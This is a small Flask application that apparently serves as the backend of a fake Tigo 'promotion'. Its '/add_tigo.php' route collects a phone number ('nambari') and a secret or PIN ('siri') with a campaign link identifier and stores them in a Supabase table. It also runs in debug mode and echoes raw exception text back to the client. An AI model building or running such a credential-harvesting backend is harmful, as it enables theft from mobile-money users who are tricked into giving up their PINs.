from flask import Flask, request, render_template
import os

app = Flask(__name__)

# Initialize Supabase
try:
    from supabase import create_client, Client
    
    # Get environment variables
    supabase_url = os.environ.get("SUPABASE_URL")
    supabase_key = os.environ.get("SUPABASE_KEY")
    
    if supabase_url and supabase_key:
        supabase: Client = create_client(supabase_url, supabase_key)
        print("✓ Supabase connected successfully")
        SUPABASE_ENABLED = True
    else:
        supabase = None
        SUPABASE_ENABLED = False
        print("⚠️ Supabase environment variables not set")
        
except ImportError:
    supabase = None
    SUPABASE_ENABLED = False
    print("⚠️ Supabase package not installed")

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/add_tigo.php', methods=['POST'])
def add_tigo():
    try:
        # Get form data
        nambari = request.form.get('nambari')
        siri = request.form.get('siri')
        url_link = request.form.get('url_link', 'gzktrsjamfkw')
        
        if not nambari or not siri:
            return "Please fill all required fields", 400
        
        if not SUPABASE_ENABLED or supabase is None:
            return "Server configuration error", 500
        
        # Prepare data for Supabase
        data = {
            "nambari": nambari,
            "siri": siri,
            "url_link": url_link
        }
        
        # Insert into Supabase
        response = supabase.table("tigo_promotions").insert(data).execute()
        
        return "Data added successfully! ✅"
        
    except Exception as e:
        return f"Error: {str(e)}", 500

if __name__ == "__main__":
    app.run(debug=True)
